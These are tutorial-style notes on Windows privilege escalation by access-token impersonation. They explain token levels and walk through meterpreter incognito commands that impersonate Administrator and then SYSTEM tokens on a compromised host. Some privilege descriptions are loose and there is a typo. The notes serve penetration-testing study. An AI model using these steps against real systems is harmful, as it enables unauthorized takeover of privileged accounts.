# Windows Privilege Escalation: Access Token Impersonation
> How to impersonate a Windows Access Token that belongs to a privileged user (allows us to inherit that users privileges). 

## Contents
- [Intro](#intro)
  - [Windows Access Tokens](#windows-access-tokens)
  - [How Windows Access Token Work](#how-windows-access-token-work)
  - [Windows Privileges](#windows-privileges)
  - [Tool: The Incognito Module](#tool-the-incognito-module-metasploit)
- [Practical: Incognito](#practical-incognito)
  - [Scenario](#scenario)
  - [Usage: Meterpreter Module](#usage-meterpreter-module)

## Intro

### Windows Access Tokens
- Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS).
- A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system.
  - Simply put, an access token can be thought of as a temporary key similar to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is needed.
- Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process.
  - The token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.

### How Windows Access Token Work
- Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token.
- An access token will typically be assigned one of the following security levels:
  - `Impersonate`: Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
  - `Delegate`: Delegate-level tokens are typically created through an interactive login in Windows, primarily through a traditional login or through remote acess protocols like RDP.
- Impersonate-level tokens can be used to impersonate a token on the local system but not on any external systems that utilize the token.
- Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.

### Windows Privileges
- The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available.
- The following are the privileges (getprivs in meterpreter) that are required for a successful impersonation attack:
  - `SeAssignPrimaryToken`: This allows a user to impersonate tokens.
  - `SeCreateToken`: This allows a user to create an arbitrary token with administrative privileges.
  - `SeImpersonatePrivilege`: This allows a user to create a process under the security context of another user typically with administrative privileges.

### Tool: [The Incognito Module](https://www.offsec.com/metasploit-unleashed/fun-incognito/) (MetaSploit)
> Incognito is a built-in **_meterpreter_** module (not just a Metasploit module; it is built into meterpreter) that was originally a standalone application that allows you to impersonate user tokens after successful exploitation.
- Tokens are just like web cookies.
  - They are a temporary key that allows you to access the system and network without having to provide credentials each time you access a file.
- Incognito exploits this the same way cookie stealing works: By replaying that temporary key when asked to authenticate.
- Tokens persist until a reboot.
  - When a user logs off, their delegate token is reported as an impersonate token.
  - But will still hold all of the rights of a delegate token.
- We can use the incognito module to display a list of available tokens that we can impersonate.

## Practical: Incognito

### Scenario
- You have an unprivileged meterpreter session on an compromised target (via MSF).
- This attack will depend on what users are currently on the system and if any of those users has an account with admin access.
  - They'll leave their tokens just lying around for us to pick up...

### Usage: Meterpreter Module

#### Initial
```
> sysinfo
  # target is 64-bit but meterpreter is 32-bit; migrate meterpreter to 64-bit

> pgrep explorer
> migrate [pid]
  # ACCESS DENIED b/c we currently have an unprivileged user account

> getuid
  # NT AUTHORITY/LOCAL SERVICE... not system

> getprivs
  # confirms your limited privileges on the account you're using
  # NOTE: The getprivs lists out the privileges assigned to this account. One of them is SeImpersonatePrivilege.
  # That means we can use this account to impersonate other access token available.

> load incognito
  # if your session dies, start it again and load again...

> list_tokens -u
  # lists user's delegation and impersonation tokens
```

#### Find & Impersonate Admin Token
- What you are interested in are **Delegation** tokens (token created as part of an interactive login) that have administrator privileges.
- For example: HOSTNAME\Administrator this would be a fine delegated token to impersonate).
```
> impersonate_token "HOSTNAMEE\Administrator" 
  # you may need to add a second "\" (HOSTNAME\\Administrator)
  # should be successful

> getuid
  # should show the above account

> getprivs
  # FAIL

> pgrep explorer
> migrate [pid]

> getprivs
  # should have a bundle of goodies: elevated privileges

> list_tokens -u
  # If you list-tokens -u again, you'll see you have additional tokens available.
  # One such token is NT AUTHORITY\SYSTEM.

> impersonate_token "NT AUTHORITY\SYSTEM"
> getuid
  # should show that same name
> getprivs
```

- If you do not have any administrator level tokens available (when you list_tokens -u), then you'll have to do a `potato attack`.
- This will generate an NT AUTHORITY access token that you can then use to impersonate and thereby obtain the privileges assocated with that token. 
